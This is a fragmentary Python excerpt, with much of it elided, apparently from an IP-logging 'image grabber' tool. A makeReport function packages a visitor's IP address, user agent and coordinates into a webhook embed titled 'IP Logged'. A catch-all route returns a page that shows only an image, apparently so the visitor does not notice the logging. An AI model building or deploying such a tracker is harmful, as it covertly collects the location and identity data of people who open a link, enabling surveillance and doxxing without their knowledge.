...
def makeReport(ip, useragent, coords=None, endpoint="N/A", url=None):
    ...
    embed = {
        "username": config["username"],
        "embeds": [{"title": "IP Logged", "color": config["color"], "description": content}]
    }
...
def catch_all(path):
    try:
        ...
        html = f"<html><body style='margin:0;padding:0;'><img src='{url}' style='width:100%;height:100%;object-fit:contain;'></body></html>"
        return html
    except:
